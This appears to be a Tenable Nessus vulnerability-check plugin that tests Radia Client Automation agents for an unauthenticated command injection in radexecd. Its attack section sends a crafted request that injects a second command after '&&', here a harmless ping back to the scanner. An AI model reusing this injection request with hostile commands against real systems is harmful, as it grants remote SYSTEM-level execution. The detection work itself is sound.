#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(86148);
 script_version("$Revision: 1.4 $");
 script_cvs_date("$Date: 2015/12/23 21:38:31 $");

 script_osvdb_id(125007);

 script_name(english:"Persistent Systems Radia Client Automation Agent Command Injection");
 script_summary(english:"Checks for a command execution vulnerability in Persistent Systems Radia Client Automation.");

 script_set_attribute(attribute:"synopsis", value:
"The Persistent Systems Radia Client Automation agent listening on the
remote port is affected by a command injection vulnerability.");
 script_set_attribute(attribute:"description", value:
"The Persistent Systems Radia Client Automation (formerly HP Client
Automation) agent listening on the remote port is affected by a
command execution vulnerability due to a flaw in the radexecd.exe
component. An unauthenticated, remote attacker can exploit this to
execute arbitrary commands with SYSTEM privileges."); 
 # https://support.accelerite.com/hc/en-us/articles/205300910-Response-to-recently-published-reports-by-Zero-Day-Initiative
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ce7789b9");
 script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-15-364");
 script_set_attribute(attribute:"solution", value:
"See the vendor advisory for a possible solution.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value:"2015/07/20");
 script_set_attribute(attribute:"plugin_publication_date", value:"2015/09/25");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:persistent_systems:radia_client_automation");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:client_automation_enterprise");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"Windows");
 script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

 script_dependencies("ovcm_notify_daemon_detect.nasl", "os_fingerprint.nasl");
 script_exclude_keys("global_settings/supplied_logins_only");
 script_require_keys("Services/radexecd");
 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("dump.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# Attack radexecd on Windows only
os = get_kb_item_or_exit("Host/OS");
if("windows" >!< tolower(os))
  audit(AUDIT_OS_NOT, "Windows");

# The port for the Notify daemon (radexecd)
port = get_service(svc:'radexecd', default:3465, exit_on_fail:TRUE);

# Attack only if the detection plugin determines noauth is enabled 
# for radexecd 
if (get_kb_item("radexecd/" + port + "/noauth") != TRUE)
  exit(0, "User authentication for radexecd on port " + port + " seems to be enabled, skipping the attack.");

s = open_sock_tcp(port);
if(!s) audit(AUDIT_SOCK_FAIL, port);

cmd = 'ping ' + this_host(); 
req = '\x00' +                          # return port; insignificant
      'USER_' + SCRIPT_NAME + '\x00' +
      'PASS_' + SCRIPT_NAME + '\x00' +
      'NovaPDC.cmd && ' + cmd + '\x00';

send(socket: s, data: req);
res = recv(socket: s, length:1024);
close(s);

if (isnull(res)) 
  audit(AUDIT_RESP_NOT, port, "a Notify request");

# Vulnerable
if (res == '\x00')
  security_hole(port: port);
else
  exit(0, "The service listening on port " + port + ' returned the following response, and is not affected.\n' + hexdump(ddata:res));
   
